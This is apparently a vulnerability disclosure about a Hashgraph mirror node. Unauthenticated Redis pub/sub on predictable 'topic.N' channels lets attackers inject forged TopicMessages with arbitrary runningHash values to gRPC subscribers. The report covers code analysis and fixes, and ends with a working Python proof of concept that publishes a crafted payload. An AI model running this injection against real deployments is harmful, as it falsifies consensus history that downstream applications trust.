### Title
Unauthenticated Redis Channel Injection Enables Tampered `runningHash` Delivery to All gRPC Topic Subscribers

### Summary
The `RedisTopicListener` subscribes to Redis pub/sub channels named with the fully predictable pattern `topic.%d` (the numeric topic entity ID). No cryptographic integrity check or source-authentication is performed on deserialized `TopicMessage` objects received from Redis before they are forwarded to every gRPC subscriber. In the reference `docker-compose.yml` deployment, Redis is exposed on `0.0.0.0:6379` with no password, allowing any network-reachable attacker to publish a crafted `TopicMessage` with an arbitrary `runningHash` that is delivered verbatim to all live subscribers as authentic Hashgraph history.

### Finding Description

**Channel naming — trivially predictable:**

`RedisTopicListener.getTopic()` constructs the channel name as:

```java
return ChannelTopic.of(String.format("topic.%d", filter.getTopicId().getId()));
``` [1](#0-0) 

The importer's `RedisPublisher` uses the identical constant:

```java
private static final String TOPIC_FORMAT = "topic.%d";
``` [2](#0-1) 

Topic IDs are public on the Hashgraph network, so any attacker can compute the exact channel name for any topic.

**No integrity validation on received messages:**

The `subscribe()` method receives raw bytes from Redis, deserializes them into a `TopicMessage`, and emits them directly:

```java
return container
    .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
    .map(Message::getMessage)   // ← no validation here
    ...
    .share();
``` [3](#0-2) 

The `TopicMessage` domain object carries `runningHash` as a plain `byte[]` with no cryptographic binding: [4](#0-3) 

**Downstream filters do not check `runningHash`:**

`CompositeTopicListener.filterMessage()` only checks `topicId` equality and `consensusTimestamp >= startTime`: [5](#0-4) 

`TopicMessageServiceImpl.subscribeTopic()` only rejects messages whose `sequenceNumber` is not greater than the last seen — a crafted message with the correct next sequence number passes: [6](#0-5) 

**The gRPC controller forwards `runningHash` verbatim:** [7](#0-6) 

**Redis is unauthenticated in the reference deployment:**

```yaml
redis:
  image: redis:6-alpine
  ports:
    - 6379:6379   # no requirepass, no bind restriction
``` [8](#0-7) 

The Helm chart does generate a random password, but the docker-compose file — the primary developer/operator reference — does not. [9](#0-8) 

### Impact Explanation
The `runningHash` field is the cryptographic chain anchor of the Hashgraph Consensus Service (HCS). Every subscriber that calls `subscribeTopic()` in live/streaming mode receives the injected message with the attacker-controlled `runningHash` as if it were a legitimate consensus event. Applications that rely on the mirror node's gRPC stream to verify topic message integrity (e.g., supply-chain provenance, audit logs, token issuance records) will silently accept falsified history. Because the shared `Flux` is multicasted (`.share()`), a single injected message reaches every concurrent subscriber of that topic simultaneously.

### Likelihood Explanation
In the docker-compose reference deployment, Redis listens on `0.0.0.0:6379` with no authentication. Any host with TCP access to port 6379 — including other containers on the same Docker network, or any host on the same LAN/cloud VPC — can publish to any `topic.*` channel. The attacker needs only: (1) knowledge of a topic ID (public), (2) the MessagePack serialization format for `TopicMessage` (derivable from `RedisConfiguration.java` and the `TopicMessage` POJO), and (3) TCP access to Redis. No credentials, no privileged position in the application stack. [10](#0-9) 

### Recommendation
1. **Require Redis authentication in all deployments**, including `docker-compose.yml`. Add `requirepass` to the Redis config and set `SPRING_DATA_REDIS_PASSWORD` in the importer and gRPC service environments.
2. **Validate `runningHash` integrity** in `RedisTopicListener` or `TopicMessageServiceImpl` by cross-checking received live messages against the database (e.g., via `TopicMessageRetriever`) before forwarding to subscribers, or by signing published messages with an HMAC key shared only between the importer and gRPC service.
3. **Bind Redis to localhost or an internal network interface** rather than `0.0.0.0` in non-Kubernetes deployments.
4. **Add a `topicId` consistency check** — verify that the `topicId` inside the deserialized `TopicMessage` matches the channel it was received on, to prevent cross-topic injection.

### Proof of Concept

```python
import msgpack, redis

# 1. Connect to unauthenticated Redis (docker-compose default)
r = redis.Redis(host='<mirror-node-host>', port=6379)

# 2. Craft a TopicMessage in MessagePack format matching TopicMessage POJO
#    field names follow Jackson snake_case convention
crafted = {
    "@type": "TopicMessage",
    "consensus_timestamp": 9999999999999999999,  # future-looking timestamp
    "sequence_number": 42,                        # next expected sequence
    "topic_id": 1234,                             # target topic entity ID
    "running_hash": b'\xde\xad\xbe\xef' * 12,    # 48 bytes of attacker-chosen hash
    "running_hash_version": 3,
    "message": b"tampered payload",
    "payer_account_id": 98,
    "chunk_num": None,
    "chunk_total": None,
    "valid_start_timestamp": None,
    "initial_transaction_id": None,
}

payload = msgpack.packb(crafted, use_bin_type=True)

# 3. Publish to the predictable channel for topic 1234
r.publish("topic.1234", payload)

# All active gRPC subscribers to topic 0.0.1234 now receive
# the tampered runningHash as authentic Hashgraph history.
```
